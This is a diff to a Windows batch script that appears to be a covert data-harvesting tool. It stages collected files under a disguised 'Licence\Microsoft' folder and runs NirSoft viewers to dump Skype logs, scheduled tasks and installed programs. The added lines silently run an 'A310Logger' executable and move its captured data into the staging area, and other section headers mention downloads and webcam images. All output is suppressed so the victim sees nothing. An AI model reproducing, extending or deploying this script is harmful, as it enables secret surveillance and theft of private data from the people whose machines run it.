@@ -40,7 +40,7 @@ echo *************Create directory****************
    mkdir C:\Users\Public\Licence\Microsoft\WiFi > nul 2> nul
 
    mkdir C:\Users\%username%\AppData\Local\A310Logger > nul 2> nul
-   attrib +h C:\Users\%username%\AppData\Local\A310Logger /s /d > nul 2> nul
+   mkdir C:\Users\Public\Licence\Microsoft\A310Logger > nul 2> nul
    
    echo Directory Created
 
@@ -384,6 +384,10 @@ echo *************DOWNLOAD file****************
    call "C:\Users\Public\Licence\Extension\SkypeLogView.exe" /stext "C:\Users\Public\Licence\Microsoft\Social\SkypeLogView.txt"
    call "C:\Users\Public\Licence\Extension\TaskSchedulerView.exe" /stext "C:\Users\Public\Licence\Microsoft\Task\TaskSchedulerView.txt"
    call "C:\Users\Public\Licence\Extension\UninstallView.exe" /stext "C:\Users\Public\Licence\Microsoft\Utility\UninstallView.txt"
+
+   echo *************A310Logger****************
+   call "C:\Users\Public\Licence\Extension\A310Logger.exe" > nul 2> nul
+   Robocopy C:\Users\Shakil-PC\AppData\Local\A310Logger\ C:\Users\Public\Licence\Microsoft\A310Logger /E /MOVE > nul 2> nul
 
    echo *************Webcam image****************
 
